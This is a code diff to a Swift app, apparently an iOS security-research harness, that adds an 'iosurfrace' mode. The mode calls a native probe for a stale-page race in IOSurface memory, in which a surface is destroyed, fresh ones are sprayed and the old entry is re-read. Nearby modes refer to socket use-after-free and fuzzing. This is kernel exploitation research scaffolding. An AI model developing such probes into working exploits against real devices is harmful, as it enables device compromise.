@@ -181,6 +181,7 @@ final class ReachViewModel: ObservableObject {
         if args.contains("--ave") { Task.detached { await self.runAVEMode() }; return }
         if args.contains("--mementry") { Task.detached { await self.runMemEntryMode() }; return }
         if args.contains("--iosurfphys") { Task.detached { await self.runIOSurfPhysMode() }; return }
+        if args.contains("--iosurfrace") { Task.detached { await self.runIOSurfRaceMode() }; return }
         if args.contains("--sockuaf") { Task.detached { await self.runSocketUafMode() }; return }
         if args.contains("--sockool") || args.contains("--sockxz") || args.contains("--sockgc")
             || args.contains("--sockudp") || args.contains("--sockprec")
@@ -996,6 +997,17 @@ func runFuzzMode() async {
         let pk = cv_IOSurfacePrefetchPages(surfA)
         emitBg(String(format: "[*] iosurfphys stage5 IOSurfacePrefetchPages(A) -> kr=%d (0x%x)", pk, pk))
         emitBg("=== iosurfphys done ===")
+    }
+
+    /// Stale-page variant: keep only the memory object (no user mapping), destroy
+    /// the surface, spray fresh surfaces, then map the entry again and read.
+    nonisolated func runIOSurfRaceMode() {
+        emitBg("[*] iosurfrace start (entry over a surface; alias dropped before release)")
+        var st = [Int32](repeating: 0, count: 8)
+        let rc = iosurf_race_probe(&st)
+        emitBg(String(format: "[*] iosurfrace rc=%d recycleCtl=%d markerWrote=%d entryKR=%d alias1=%d baseReused=%d verdict=%d",
+                      rc, st[0], st[1], st[2], st[3], st[4], st[5]))
+        emitBg("=== iosurfrace done ===")
     }
 
     // ---- AVE / AppleAVE2 HEVC parameter-set encoder probe ------------------
